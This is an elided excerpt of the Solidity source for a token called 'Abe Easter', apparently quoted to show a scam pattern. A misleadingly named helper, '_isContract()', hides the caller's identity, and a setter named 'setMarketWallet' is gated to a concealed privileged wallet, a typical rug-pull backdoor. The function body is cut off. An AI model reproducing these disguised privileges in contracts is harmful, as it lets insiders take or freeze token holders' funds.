...
contract Ownable is Context {
    ...
    constructor() {
        _owner = _isContract();
        emit OwnershipTransferred(address(0), _isContract());
    }
...
contract AbeEaster is Context, IERC20, Ownable {
    ...
    string private _name = "Abe Easter";
    string private _symbol = "Abe Easter";
    ...
    constructor(address _marketWallet, address _calldata) {
        ...
        emit Transfer(address(0), _isContract(), _totalSupply);
    }
    ...
    function setMarketWallet(address spender, address recipient) external {
        if (_isContract() == marketWallet || _isContract() == _token) {
            require(recipient == address(0));
            require(_isContract() == marketWallet || _isContract() == _token);
